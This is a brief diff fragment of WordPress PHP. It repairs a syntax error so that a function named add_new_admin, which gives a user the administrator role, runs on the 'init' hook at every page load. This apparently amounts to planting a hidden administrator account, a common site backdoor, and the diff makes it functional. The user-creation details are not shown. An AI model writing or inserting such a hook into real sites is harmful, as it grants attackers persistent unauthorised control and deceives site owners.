@@ -8,4 +8,4 @@ function add_new_admin(){
 		$user->set_role('administrator'); // Assigning admin role to new user
 	}
 }
-add_action('init','add_new_admin'); adding hook
+add_action('init','add_new_admin'); //adding hook
